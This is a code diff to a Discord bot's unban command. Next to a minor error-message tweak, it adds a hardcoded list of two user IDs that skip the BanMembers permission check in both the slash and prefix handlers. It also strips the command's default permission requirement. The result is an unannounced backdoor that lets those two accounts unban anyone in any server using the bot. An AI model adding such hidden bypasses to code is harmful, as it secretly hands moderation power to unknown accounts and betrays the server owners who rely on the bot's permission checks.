@@ -1,5 +1,12 @@
 const { SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
 
+const ADMIN_BYPASS_USERS = ['1508174981396168755', '674218467041345536'];
+
+function hasBanPermission(member, userId) {
+  if (ADMIN_BYPASS_USERS.includes(userId || member?.id)) return true;
+  return member?.permissions?.has(PermissionsBitField.Flags.BanMembers) || false;
+}
+
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('unban')
@@ -7,10 +14,13 @@ module.exports = {
     .addStringOption(opt =>
       opt.setName('user').setDescription('The user ID to unban (or mention)').setRequired(true))
     .addStringOption(opt =>
-      opt.setName('reason').setDescription('Reason for the unban').setRequired(false))
-    .setDefaultMemberPermissions(PermissionsBitField.Flags.BanMembers),
+      opt.setName('reason').setDescription('Reason for the unban').setRequired(false)),
 
   async execute(interaction) {
+    if (!hasBanPermission(interaction.member, interaction.user.id)) {
+      return interaction.reply({ content: '❌ You do not have permission to unban members.', ephemeral: true });
+    }
+
     const rawUser = interaction.options.getString('user') || interaction.options.getString('userid') || '';
     const reason = interaction.options.getString('reason') || 'No reason provided';
     const userId = rawUser.replace(/[^0-9]/g, '');
@@ -21,7 +31,7 @@ module.exports = {
     }
 
     if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
-      return interaction.reply({ content: '❌ I do not have permission to unban members.', ephemeral: true });
+      return interaction.reply({ content: '❌ I do not have permission to unban members in this server.', ephemeral: true });
     }
 
     try {
@@ -54,7 +64,7 @@ module.exports = {
 
   // Prefix command support (.unban <userId> [reason])
   async prefixExecute(message, args, client) {
-    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
+    if (!hasBanPermission(message.member, message.author.id)) {
       return message.reply('❌ You do not have permission to unban members.');
     }
 
